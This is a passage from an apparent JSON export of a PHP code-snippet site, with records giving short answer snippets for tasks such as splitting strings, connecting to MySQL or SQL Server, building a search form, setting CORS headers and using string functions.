    "title": " php split string at first space",
    "description": "$array = explode(' ', $string, 2);\n",
    "reg_date": "2021-10-12T10:19:23.000Z"
  },
  {
    "id": 4223,
    "keyword": null,
    "link": null,
    "title": " php split string into array of characters",
    "description": "//Split int char array $chars = str_split($str);  //Loop each char foreach($chars as $char) {     // your code }\n",
    "reg_date": "2021-10-12T10:19:23.000Z"
  },
  {
    "id": 4224,
    "keyword": null,
    "link": null,
    "title": " php sql connection",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n$servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\";   Simplified  $conn = mysqli_connect('localhost', 'username', 'password'); $database = mysqli_select_db($conn, 'database');\n <?php $serverName = \"serverName\\\\sqlexpress\"; //serverName\\instanceName  // Since UID and PWD are not specified in the $connectionInfo array, // The connection will be attempted using Windows Authentication. $connectionInfo = array( \"Database\"=>\"dbName\"); $conn = sqlsrv_connect( $serverName, $connectionInfo);  if( $conn ) {      echo \"Connection established.<br />\"; }else{      echo \"Connection could not be established.<br />\";      die( print_r( sqlsrv_errors(), true)); } ?>  \n<?php ///////////neha jaiswal///// /////set variable///////// $serve=\"localhost\"; $user=\"root\"; $password=\"\"; $db=\"cart_system\";///database name ///create connection with db//// $conn=mysqli_connect($serve,$user,$password,$db); ////check condition for connection fail or not  if ($conn) {  echo \"connection success\";   }else {echo \"connection unsuccess\";   }   ?>\n<?php  function init_db() {     try {          $host = 'localhost';         $dbname = 'db_name';         $charset =  'utf8';         $user =   'root';         $password =  '';          $db = new PDO(\"mysql:host=$host;dbname=$dbname;charset=$charset\",             $user,             $password);      } catch (Exception $e) {         die('Erreur : ' . $e->getMessage());     }      return $db; }\n",
    "reg_date": "2021-10-12T10:19:23.000Z"
  },
  {
    "id": 4225,
    "keyword": null,
    "link": null,
    "title": " php sql last 10 rows",
    "description": "SELECT * FROM big_table ORDER BY A DESC LIMIT 10\n",
    "reg_date": "2021-10-12T10:19:24.000Z"
  },
  {
    "id": 4226,
    "keyword": null,
    "link": null,
    "title": " php sql search form",
    "description": " <?php $localhost = \"localhost\"; $username = \"root\"; $password = \"\"; $dbname = \"samueldb\"; $con = new mysqli($localhost, $username, $password, $dbname); if( $con->connect_error){     die('Error: ' . $con->connect_error); } $sql = \"SELECT * FROM users\"; if( isset($_GET['search']) ){     $name = mysqli_real_escape_string($con, htmlspecialchars($_GET['search']));     $sql = \"SELECT * FROM users WHERE firstname ='$name'\"; } $result = $con->query($sql); ?> <!DOCTYPE html> <html> <head> <title>Basic Search form using mysqli</title> <link rel=\"stylesheet\" type=\"text/css\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\"> </head> <body> <div class=\"container\"> <label>Search</label> <form action=\"\" method=\"GET\"> <input type=\"text\" placeholder=\"Type the name here\" name=\"search\">  <input type=\"submit\" value=\"Search\" name=\"btn\" class=\"btn btn-sm btn-primary\"> </form> <h2>List of students</h2> <table class=\"table table-striped table-responsive\"> <tr> <th>ID</th> <th>First name</th> <th>Lastname</th> <th>Address</th> <th>Contact</th> </tr> <?php while($row = $result->fetch_assoc()){     ?>     <tr>     <td><?php echo $row['user_id']; ?></td>     <td><?php echo $row['firstname']; ?></td>     <td><?php echo $row['lastname']; ?></td>     <td><?php echo $row['address']; ?></td>     <td><?php echo $row['contact']; ?></td>     </tr>     <?php } ?> </table> </div> </body> </html> \n$result = mysqli_query($con, \"SELECT * FROM employees     WHERE first_name LIKE '%{$name}%' OR last_name LIKE '%{$name}%'\");  while ($row = mysqli_fetch_array($result)) {         echo $row['first_name'] . \" \" . $row['last_name'];         echo \"<br>\"; }     mysqli_close($con);     ?>\n",
    "reg_date": "2021-10-12T10:19:24.000Z"
  },
  {
    "id": 4227,
    "keyword": null,
    "link": null,
    "title": " php sql sever connection code",
    "description": " <?php $serverName = \"serverName\\\\sqlexpress\"; //serverName\\instanceName  // Since UID and PWD are not specified in the $connectionInfo array, // The connection will be attempted using Windows Authentication. $connectionInfo = array( \"Database\"=>\"dbName\"); $conn = sqlsrv_connect( $serverName, $connectionInfo);  if( $conn ) {      echo \"Connection established.<br />\"; }else{      echo \"Connection could not be established.<br />\";      die( print_r( sqlsrv_errors(), true)); } ?>  \n",
    "reg_date": "2021-10-12T10:19:24.000Z"
  },
  {
    "id": 4228,
    "keyword": null,
    "link": null,
    "title": " php start of day epoch",
    "description": "$beginOfDay = strtotime(\"today\", $timestamp); $endOfDay   = strtotime(\"tomorrow\", $beginOfDay) - 1;\n",
    "reg_date": "2021-10-12T10:19:24.000Z"
  },
  {
    "id": 4229,
    "keyword": null,
    "link": null,
    "title": " php start session if not started",
    "description": "if (session_status() == PHP_SESSION_NONE) {     session_start(); }\n#you could just ignore warnings messages @session_start(); \n",
    "reg_date": "2021-10-12T10:19:24.000Z"
  },
  {
    "id": 4230,
    "keyword": null,
    "link": null,
    "title": " php static dropdown list example",
    "description": "<?php $toy_cars = array(\"Pull Back Cars\",\"Remote Cars\", \"Electric Cars\", \"Toy Race Cars\",\"Lightening Cars\"); $array_length = count($toy_cars); ?> <select name=\"dynamic_data\"> <?php for ($i=0;$i<$array_length;$i++){ ?> <option value=\"<?=$toy_cars[$i];?>\"><?=$toy_cars[$i];?></option> <?php } ?> </select>\n",
    "reg_date": "2021-10-12T10:19:24.000Z"
  },
  {
    "id": 4231,
    "keyword": null,
    "link": null,
    "title": " php status code",
    "description": "    100 => 'Continue',     101 => 'Switching Protocols',     102 => 'Processing', // WebDAV; RFC 2518     103 => 'Early Hints', // RFC 8297     200 => 'OK',     201 => 'Created',     202 => 'Accepted',     203 => 'Non-Authoritative Information', // since HTTP/1.1     204 => 'No Content',     205 => 'Reset Content',     206 => 'Partial Content', // RFC 7233     207 => 'Multi-Status', // WebDAV; RFC 4918     208 => 'Already Reported', // WebDAV; RFC 5842     226 => 'IM Used', // RFC 3229     300 => 'Multiple Choices',     301 => 'Moved Permanently',     302 => 'Found', // Previously \"Moved temporarily\"     303 => 'See Other', // since HTTP/1.1     304 => 'Not Modified', // RFC 7232     305 => 'Use Proxy', // since HTTP/1.1     306 => 'Switch Proxy',     307 => 'Temporary Redirect', // since HTTP/1.1     308 => 'Permanent Redirect', // RFC 7538     400 => 'Bad Request',     401 => 'Unauthorized', // RFC 7235     402 => 'Payment Required',     403 => 'Forbidden',     404 => 'Not Found',     405 => 'Method Not Allowed',     406 => 'Not Acceptable',     407 => 'Proxy Authentication Required', // RFC 7235     408 => 'Request Timeout',     409 => 'Conflict',     410 => 'Gone',     411 => 'Length Required',     412 => 'Precondition Failed', // RFC 7232     413 => 'Payload Too Large', // RFC 7231     414 => 'URI Too Long', // RFC 7231     415 => 'Unsupported Media Type', // RFC 7231     416 => 'Range Not Satisfiable', // RFC 7233     417 => 'Expectation Failed',     418 => 'I\\'m a teapot', // RFC 2324, RFC 7168     421 => 'Misdirected Request', // RFC 7540     422 => 'Unprocessable Entity', // WebDAV; RFC 4918     423 => 'Locked', // WebDAV; RFC 4918     424 => 'Failed Dependency', // WebDAV; RFC 4918     425 => 'Too Early', // RFC 8470     426 => 'Upgrade Required',     428 => 'Precondition Required', // RFC 6585     429 => 'Too Many Requests', // RFC 6585     431 => 'Request Header Fields Too Large', // RFC 6585     451 => 'Unavailable For Legal Reasons', // RFC 7725     500 => 'Internal Server Error',     501 => 'Not Implemented',     502 => 'Bad Gateway',     503 => 'Service Unavailable',     504 => 'Gateway Timeout',     505 => 'HTTP Version Not Supported',     506 => 'Variant Also Negotiates', // RFC 2295     507 => 'Insufficient Storage', // WebDAV; RFC 4918     508 => 'Loop Detected', // WebDAV; RFC 5842     510 => 'Not Extended', // RFC 2774     511 => 'Network Authentication Required', // RFC 6585\n <?php  // R&eacute;cup&eacute;rer le code actuel de r&eacute;ponse et d&eacute;finir un nouveau var_dump(http_response_code(404));  // R&eacute;cup&eacute;rer le nouveau code de r&eacute;ponse var_dump(http_response_code()); ?>  \n",
    "reg_date": "2021-10-12T10:19:24.000Z"
  },
  {
    "id": 4232,
    "keyword": null,
    "link": null,
    "title": " php stdclass",
    "description": "//create a person object in PHP  $person=new stdClass();  $person->firstName=\"Chuck\";  $person->lastName=\"Bartowski\";  $person->age=27;    print_r($person);    \n   $object = new stdClass();    $object->property = 'Here we go';     var_dump($object);    /*    outputs:     object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */\nnew stdClass()\n",
    "reg_date": "2021-10-12T10:19:24.000Z"
  },
  {
    "id": 4233,
    "keyword": null,
    "link": null,
    "title": " php stdclass to array",
    "description": "// The manual specifies the second argument of json_decode as: //\t assoc //\t\tWhen TRUE, returned objects will be converted into associative arrays.   $array = json_decode(json_encode($booking), true);\n$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n$array = json_decode(json_encode($object), true); \n",
    "reg_date": "2021-10-12T10:19:24.000Z"
  },
  {
    "id": 4234,
    "keyword": null,
    "link": null,
    "title": " php stmt prepare error",
    "description": "$stmt = $mysqli->prepare(\"INSERT INTO testtable VALUES (?,?,?)\"); // prepare() can fail because of syntax errors, missing privileges, .... if ( false===$stmt ) {   // and since all the following operations need a valid/ready statement object   // it doesn't make sense to go on   // you might want to use a more sophisticated mechanism than die()   // but's it's only an example   die('prepare() failed: ' . htmlspecialchars($mysqli->error)); }  $rc = $stmt->bind_param('iii', $x, $y, $z); // bind_param() can fail because the number of parameter doesn't match the placeholders in the statement // or there's a type conflict(?), or .... if ( false===$rc ) {   // again execute() is useless if you can't bind the parameters. Bail out somehow.   die('bind_param() failed: ' . htmlspecialchars($stmt->error)); }  $rc = $stmt->execute(); // execute() can fail for various reasons. And may it be as stupid as someone tripping over the network cable // 2006 \"server gone away\" is always an option if ( false===$rc ) {   die('execute() failed: ' . htmlspecialchars($stmt->error)); }  $stmt->close(); \n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4235,
    "keyword": null,
    "link": null,
    "title": " php storage link",
    "description": "php artisan storage:link \n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4236,
    "keyword": null,
    "link": null,
    "title": " php store log in a text file",
    "description": "$log_content=\"This line is logged on 2020-08-14 09:55:00\"; $myfile = fopen(\"log.txt\", \"a\") or die(\"Unable to open file!\"); fwrite($myfile, $log_content); fclose($myfile);\n//Something to write to txt log $log  = \"User: \".$_SERVER['REMOTE_ADDR'].' - '.date(\"F j, Y, g:i a\").PHP_EOL.         \"Attempt: \".($result[0]['success']=='1'?'Success':'Failed').PHP_EOL.         \"User: \".$username.PHP_EOL.         \"-------------------------\".PHP_EOL; //Save string to log, use FILE_APPEND to append. file_put_contents('./log_'.date(\"j.n.Y\").'.log', $log, FILE_APPEND); \n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4237,
    "keyword": null,
    "link": null,
    "title": " php store sorted array",
    "description": "$array = array(); $sorted_array = $array; asort($sorted_array);\n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4238,
    "keyword": null,
    "link": null,
    "title": " php str pad not working",
    "description": "str_pad($myString, 9, '0', STR_PAD_LEFT); // \"000024896\"\n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4239,
    "keyword": null,
    "link": null,
    "title": " php str replace",
    "description": "<?php //str_replace(\"Original Value\", \"Value to be replaced\", \"String\"); $result = str_replace(\"1\", \"2\", \"This is number 1\"); // Output: This is number 2 ?>\nstr_replace ($search, $replace, $subject);\n$var1 = 'hello.world'; $var2 = str_replace(\".\", \"-\", $var1); echo $var2; // hello-world \n$new_string = str_replace( $take_out, $put_in, $string);\necho str_replace(\"worss\",\"world\",\"Hello worss in PHP!!\");\n <?php  // Produce: Hll Wrld f PHP $vowels = array(\"a\", \"e\", \"i\", \"o\", \"u\", \"A\", \"E\", \"I\", \"O\", \"U\"); $onlyconsonants = str_replace($vowels, \"\", \"Hello World of PHP\");  ?>  \n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4240,
    "keyword": null,
    "link": null,
    "title": " php str replace multiple",
    "description": "str_replace(array(':', '\\\\', '/', '*'), ' ', $string); \n// Provides: You should eat pizza, beer, and ice cream every day $phrase  = \"You should eat fruits, vegetables, and fiber every day.\"; $healthy = [\"fruits\", \"vegetables\", \"fiber\"]; $yummy   = [\"pizza\", \"beer\", \"ice cream\"];  $newPhrase = str_replace($healthy, $yummy, $phrase);\nprint str_replace(     array(\"search1\",\"search2\"),     array(\"replace1\", \"replace2\"),     \"search1 search2\" ); \n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4241,
    "keyword": null,
    "link": null,
    "title": " php str to int",
    "description": "intval($string);\ns = \"123\"; echo intval(s); // 123  s = \"hello\"; echo intval(s);\t//0\n$num = \"3.14\";  $int = (int)$num;//string to int $float = (float)$num;//string to float\n$num = \"3.14\"; $int = (int)$num;\nphpCopy<?php   $variable = \"53\"; $integer = intval($variable); echo \"The variable $variable has converted to a number and its value is $integer.\";   echo \"\\n\";  $variable = \"25.3\"; $float = floatval($variable); echo \"The variable $variable has converted to a number and its value is $float.\";   ?> \nintval(\"15\");\n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4242,
    "keyword": null,
    "link": null,
    "title": " php strc types",
    "description": "declare(strict_types = 1);\n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4243,
    "keyword": null,
    "link": null,
    "title": " php strftime",
    "description": "<?php setlocale(LC_TIME, \"C\"); echo strftime(\"%A\"); setlocale(LC_TIME, \"fi_FI\"); echo strftime(\" in Finnish is %A,\"); setlocale(LC_TIME, \"fr_FR\"); echo strftime(\" in French %A and\"); setlocale(LC_TIME, \"de_DE\"); echo strftime(\" in German %A.\\n\"); // Syntax: strftime ( string $format [, int $timestamp = time() ] ) : string /* Parameters: The following characters are recognized in the format parameter string format\tDescription\tExample returned values Day\t---\t--- %a\tAn abbreviated textual representation of the day\tSun through Sat %A\tA full textual representation of the day\tSunday through Saturday %d\tTwo-digit day of the month (with leading zeros)\t01 to 31 %e\tDay of the month, with a space preceding single digits. Not implemented as described on Windows. See below for more information.\t1 to 31 %j\tDay of the year, 3 digits with leading zeros\t001 to 366 %u\tISO-8601 numeric representation of the day of the week\t1 (for Monday) through 7 (for Sunday) %w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) Week\t---\t--- %U\tWeek number of the given year, starting with the first Sunday as the first week\t13 (for the 13th full week of the year) %V\tISO-8601:1988 week number of the given year, starting with the first week of the year with at least 4 weekdays, with Monday being the start of the week\t01 through 53 (where 53 accounts for an overlapping week) %W\tA numeric representation of the week of the year, starting with the first Monday as the first week\t46 (for the 46th week of the year beginning with a Monday) Month\t---\t--- %b\tAbbreviated month name, based on the locale\tJan through Dec %B\tFull month name, based on the locale\tJanuary through December %h\tAbbreviated month name, based on the locale (an alias of %b)\tJan through Dec %m\tTwo digit representation of the month\t01 (for January) through 12 (for December) Year\t---\t--- %C\tTwo digit representation of the century (year divided by 100, truncated to an integer)\t19 for the 20th Century %g\tTwo digit representation of the year going by ISO-8601:1988 standards (see %V)\tExample: 09 for the week of January 6, 2009 %G\tThe full four-digit version of %g\tExample: 2008 for the week of January 3, 2009 %y\tTwo digit representation of the year\tExample: 09 for 2009, 79 for 1979 %Y\tFour digit representation for the year\tExample: 2038 Time\t---\t--- %H\tTwo digit representation of the hour in 24-hour format\t00 through 23 %k\tHour in 24-hour format, with a space preceding single digits\t0 through 23 %I\tTwo digit representation of the hour in 12-hour format\t01 through 12 %l (lower-case 'L')\tHour in 12-hour format, with a space preceding single digits\t1 through 12 %M\tTwo digit representation of the minute\t00 through 59 %p\tUPPER-CASE 'AM' or 'PM' based on the given time\tExample: AM for 00:31, PM for 22:23 %P\tlower-case 'am' or 'pm' based on the given time\tExample: am for 00:31, pm for 22:23 %r\tSame as \"%I:%M:%S %p\"\tExample: 09:34:17 PM for 21:34:17 %R\tSame as \"%H:%M\"\tExample: 00:35 for 12:35 AM, 16:44 for 4:44 PM %S\tTwo digit representation of the second\t00 through 59 %T\tSame as \"%H:%M:%S\"\tExample: 21:34:17 for 09:34:17 PM %X\tPreferred time representation based on locale, without the date\tExample: 03:59:16 or 15:59:16 %z\tThe time zone offset. Not implemented as described on Windows. See below for more information.\tExample: -0500 for US Eastern Time %Z\tThe time zone abbreviation. Not implemented as described on Windows. See below for more information.\tExample: EST for Eastern Time Time and Date Stamps\t---\t--- %c\tPreferred date and time stamp based on locale\tExample: Tue Feb 5 00:45:10 2009 for February 5, 2009 at 12:45:10 AM %D\tSame as \"%m/%d/%y\"\tExample: 02/05/09 for February 5, 2009 %F\tSame as \"%Y-%m-%d\" (commonly used in database datestamps)\tExample: 2009-02-05 for February 5, 2009 %s\tUnix Epoch Time timestamp (same as the time() function)\tExample: 305815200 for September 10, 1979 08:40:00 AM %x\tPreferred date representation based on locale, without the time\tExample: 02/05/09 for February 5, 2009 Miscellaneous\t---\t--- %n\tA newline character (\"\\n\")\t--- %t\tA Tab character (\"\\t\")\t--- %%\tA literal percentage character (\"%\")\t--- */ ?>  \nsetlocale(LC_TIME, 'it_IT.UTF-8'); $date = new DateTime($run['at']); strftime(\"%d %B\", $date->getTimestamp())\n",
    "reg_date": "2021-10-12T10:19:25.000Z"
  },
  {
    "id": 4244,
    "keyword": null,
    "link": null,
    "title": " php strftime datetime",
    "description": "<?php setlocale(LC_TIME, \"C\"); echo strftime(\"%A\"); setlocale(LC_TIME, \"fi_FI\"); echo strftime(\" in Finnish is %A,\"); setlocale(LC_TIME, \"fr_FR\"); echo strftime(\" in French %A and\"); setlocale(LC_TIME, \"de_DE\"); echo strftime(\" in German %A.\\n\"); // Syntax: strftime ( string $format [, int $timestamp = time() ] ) : string /* Parameters: The following characters are recognized in the format parameter string format\tDescription\tExample returned values Day\t---\t--- %a\tAn abbreviated textual representation of the day\tSun through Sat %A\tA full textual representation of the day\tSunday through Saturday %d\tTwo-digit day of the month (with leading zeros)\t01 to 31 %e\tDay of the month, with a space preceding single digits. Not implemented as described on Windows. See below for more information.\t1 to 31 %j\tDay of the year, 3 digits with leading zeros\t001 to 366 %u\tISO-8601 numeric representation of the day of the week\t1 (for Monday) through 7 (for Sunday) %w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) Week\t---\t--- %U\tWeek number of the given year, starting with the first Sunday as the first week\t13 (for the 13th full week of the year) %V\tISO-8601:1988 week number of the given year, starting with the first week of the year with at least 4 weekdays, with Monday being the start of the week\t01 through 53 (where 53 accounts for an overlapping week) %W\tA numeric representation of the week of the year, starting with the first Monday as the first week\t46 (for the 46th week of the year beginning with a Monday) Month\t---\t--- %b\tAbbreviated month name, based on the locale\tJan through Dec %B\tFull month name, based on the locale\tJanuary through December %h\tAbbreviated month name, based on the locale (an alias of %b)\tJan through Dec %m\tTwo digit representation of the month\t01 (for January) through 12 (for December) Year\t---\t--- %C\tTwo digit representation of the century (year divided by 100, truncated to an integer)\t19 for the 20th Century %g\tTwo digit representation of the year going by ISO-8601:1988 standards (see %V)\tExample: 09 for the week of January 6, 2009 %G\tThe full four-digit version of %g\tExample: 2008 for the week of January 3, 2009 %y\tTwo digit representation of the year\tExample: 09 for 2009, 79 for 1979 %Y\tFour digit representation for the year\tExample: 2038 Time\t---\t--- %H\tTwo digit representation of the hour in 24-hour format\t00 through 23 %k\tHour in 24-hour format, with a space preceding single digits\t0 through 23 %I\tTwo digit representation of the hour in 12-hour format\t01 through 12 %l (lower-case 'L')\tHour in 12-hour format, with a space preceding single digits\t1 through 12 %M\tTwo digit representation of the minute\t00 through 59 %p\tUPPER-CASE 'AM' or 'PM' based on the given time\tExample: AM for 00:31, PM for 22:23 %P\tlower-case 'am' or 'pm' based on the given time\tExample: am for 00:31, pm for 22:23 %r\tSame as \"%I:%M:%S %p\"\tExample: 09:34:17 PM for 21:34:17 %R\tSame as \"%H:%M\"\tExample: 00:35 for 12:35 AM, 16:44 for 4:44 PM %S\tTwo digit representation of the second\t00 through 59 %T\tSame as \"%H:%M:%S\"\tExample: 21:34:17 for 09:34:17 PM %X\tPreferred time representation based on locale, without the date\tExample: 03:59:16 or 15:59:16 %z\tThe time zone offset. Not implemented as described on Windows. See below for more information.\tExample: -0500 for US Eastern Time %Z\tThe time zone abbreviation. Not implemented as described on Windows. See below for more information.\tExample: EST for Eastern Time Time and Date Stamps\t---\t--- %c\tPreferred date and time stamp based on locale\tExample: Tue Feb 5 00:45:10 2009 for February 5, 2009 at 12:45:10 AM %D\tSame as \"%m/%d/%y\"\tExample: 02/05/09 for February 5, 2009 %F\tSame as \"%Y-%m-%d\" (commonly used in database datestamps)\tExample: 2009-02-05 for February 5, 2009 %s\tUnix Epoch Time timestamp (same as the time() function)\tExample: 305815200 for September 10, 1979 08:40:00 AM %x\tPreferred date representation based on locale, without the time\tExample: 02/05/09 for February 5, 2009 Miscellaneous\t---\t--- %n\tA newline character (\"\\n\")\t--- %t\tA Tab character (\"\\t\")\t--- %%\tA literal percentage character (\"%\")\t--- */ ?>  \nsetlocale(LC_TIME, 'it_IT.UTF-8'); $date = new DateTime($run['at']); strftime(\"%d %B\", $date->getTimestamp())\n",
    "reg_date": "2021-10-12T10:19:26.000Z"
  },
  {
    "id": 4245,
    "keyword": null,
    "link": null,
    "title": " php stric type",
    "description": "declare(strict_types = 1);\n",
    "reg_date": "2021-10-12T10:19:26.000Z"
  },
  {
    "id": 4246,
    "keyword": null,
    "link": null,
    "title": " php strict-origin-when-cross-origin",
    "description": "<?php header(\"Access-Control-Allow-Origin: *\"); header(\"Access-Control-Allow-Headers: *\"); ...\n header(\"Access-Control-Allow-Origin: *\");\n/**  *  An example CORS-compliant method.  It will allow any GET, POST, or OPTIONS requests from any  *  origin.  *  *  In a production environment, you probably want to be more restrictive, but this gives you  *  the general idea of what is involved.  For the nitty-gritty low-down, read:  *  *  - https://developer.mozilla.org/en/HTTP_access_control  *  - http://www.w3.org/TR/cors/  *  */ function cors() {      // Allow from any origin     if (isset($_SERVER['HTTP_ORIGIN'])) {         // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one         // you want to allow, and if so:         header(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");         header('Access-Control-Allow-Credentials: true');         header('Access-Control-Max-Age: 86400');    // cache for 1 day     }      // Access-Control headers are received during OPTIONS requests     if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {          if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))             // may also be using PUT, PATCH, HEAD etc             header(\"Access-Control-Allow-Methods: GET, POST, OPTIONS\");                   if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))             header(\"Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}\");          exit(0);     }      echo \"You have CORS!\"; }\n",
    "reg_date": "2021-10-12T10:19:26.000Z"
  },
  {
    "id": 4247,
    "keyword": null,
    "link": null,
    "title": " php strict mode",
    "description": "<?php declare(strict_types = 1);\ndeclare(strict_types = 1);\n",
    "reg_date": "2021-10-12T10:19:26.000Z"
  },
  {
    "id": 4248,
    "keyword": null,
    "link": null,
    "title": " php string contains",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$string = 'The lazy fox jumped over the fence';  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  \n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; } \n <?php $string = 'The lazy fox jumped over the fence';  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  if (str_contains($string, 'Lazy')) {     echo 'The string \"Lazy\" was found in the string'; } else {     echo '\"Lazy\" was not found because the case does not match'; }  ?>  \n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\nstr_contains(string $haystack , string $needle);\n",
    "reg_date": "2021-10-12T10:19:26.000Z"
  },
  {
    "id": 4249,
    "keyword": null,
    "link": null,
    "title": " php string contains substring",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$string = 'The lazy fox jumped over the fence';  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  \n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; } \nif (strpos($string, 'substring') !== false) { \t// do stuff  }\n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\n$a = 'Hello world?';  if (strpos($a, 'Hello') !== false) { //PAY ATTENTION TO !==, not !=     echo 'true'; } if (stripos($a, 'HELLO') !== false) { //Case insensitive     echo 'true'; }\n",
    "reg_date": "2021-10-12T10:19:26.000Z"
  },
  {
    "id": 4250,
    "keyword": null,
    "link": null,
    "title": " php string cut first x characters",
    "description": "$str = \"The quick brown fox jumps over the lazy dog.\" $str2 = substr($str, 4); // \"quick brown fox jumps over the lazy dog.\" \n$str = substr($str, 1);\n",
    "reg_date": "2021-10-12T10:19:26.000Z"
  },
  {
    "id": 4251,
    "keyword": null,
    "link": null,
    "title": " php string ends with",
    "description": "function stringStartsWith($haystack,$needle,$case=true) {      if ($case){          return strpos($haystack, $needle, 0) === 0;      }      return stripos($haystack, $needle, 0) === 0;  }    function stringEndsWith($haystack,$needle,$case=true) {      $expectedPosition = strlen($haystack) - strlen($needle);      if ($case){          return strrpos($haystack, $needle, 0) === $expectedPosition;      }      return strripos($haystack, $needle, 0) === $expectedPosition;  }  echo stringStartsWith(\"Hello World\",\"Hell\"); // true  echo stringEndsWith(\"Hello World\",\"World\"); // true\nfunction startsWith($haystack, $needle) {      $length = strlen($needle);      return (substr($haystack, 0, $length) === $needle); }  function endsWith($haystack, $needle) {     $length = strlen($needle);     if ($length == 0) {         return true;     }      return (substr($haystack, -$length) === $needle); }\n",
    "reg_date": "2021-10-12T10:19:26.000Z"
  },
  {
    "id": 4252,
    "keyword": null,
    "link": null,
    "title": " php string functions",
    "description": "#String Functions  substr()  #Returns a portion of a string =========== <?php     #substr()  Returns a portion of a string     $output = substr('Hello', 1, 3);     $output1 = substr('Hello', -2);//starts from the back of the string     echo $output;     echo '<br>';     echo $output1; ?> =============== strlen() #Returns the length of a string ===============     $output = strlen('Hello');     echo $output; ?> =============== strpos() #finds the position of the first occurence of a sub string ===============     $output = strpos('Hello World', 'o');     echo $output;     $output1 = strrpos('Hello World', 'o'); #last occurance     echo $output1; ================ trim()  # trims white space ================  $text = 'Hello World                ';     var_dump($text);     echo '<br>';     $trimmed = trim($text);     echo $trimmed;     echo '<br>';     var_dump($trimmed); ================== strtoupper() # makes everything uppercase ================== $text = 'Hello World';     $uppercase = strtoupper($text);     echo $uppercase; ================== strtolower() #makes everything lowercase ==================   $text = 'Hello World';     $lowercase = strtolower($text);     echo $lowercase; ================== ucwords() #Capitalizes every word ===================     $text = 'hello world';     $proppercase = ucwords($text);     echo $proppercase; ================== str_replace() #Replace all occurances of a search string                #with a replacement ================== $text = 'hello world';     $wordreplace = str_replace('world', 'john', $text);     echo $wordreplace; ================= is_string() #Checks to see if it is a string =================     $val = 'Hello';     $output = is_string($val);     echo $output;     echo '<br>';      $values = array(true, false, null, 'abc', 33, '33',     22.4, '22.4', '', ' ', 0, '0');      foreach($values as $value){         if(is_string($value)){         echo \"{$value} is a string<br>\";     } } ================= gzcompress() # Compress a string =================     $string =      \"a;laksd;lk;lkasd;lkas;lk;lkd;lkasd;lka;lskd;lka;lkd;lk     as;l;laksd;lk;lkasd;lkas;ldk;laskd;lakd;lkad;l     adslkjlkasjdlkjlkjaslkjaslkdjlkajdlkajdlkajd     alskdjlkasjdlkjadlkjadlkjadlkjadlajd     adlkjlkjalksjdlkjlkjlkjklajsda\";      $compressed = gzcompress($string);          echo $compressed;     echo '<br>';      $original = gzuncompress($compressed);      echo $original;\n <?php echo 'this is a simple string';  echo 'You can also have embedded newlines in strings this way as it is okay to do';  // Outputs: Arnold once said: \"I'll be back\" echo 'Arnold once said: \"I\\'ll be back\"';  // Outputs: You deleted C:\\*.*? echo 'You deleted C:\\\\*.*?';  // Outputs: You deleted C:\\*.*? echo 'You deleted C:\\*.*?';  // Outputs: This will not expand: \\n a newline echo 'This will not expand: \\n a newline';  // Outputs: Variables do not $expand $either echo 'Variables do not $expand $either'; ?>  \nreturning portion of a string\n<?php $x = 'kinjal'; echo \"Length of string is: \".strlen($x); echo \"<br>Count of word: \".str_word_count($x); echo \"<br>Reverse the string: \".strrev($x); echo \"<br>Position of string: \".strpos('Have a nice day!','nice');  //2 argument echo \"<br>String replace: \".str_replace('good','nice','have a good day!');  //3 argument echo \"<br>String convert to 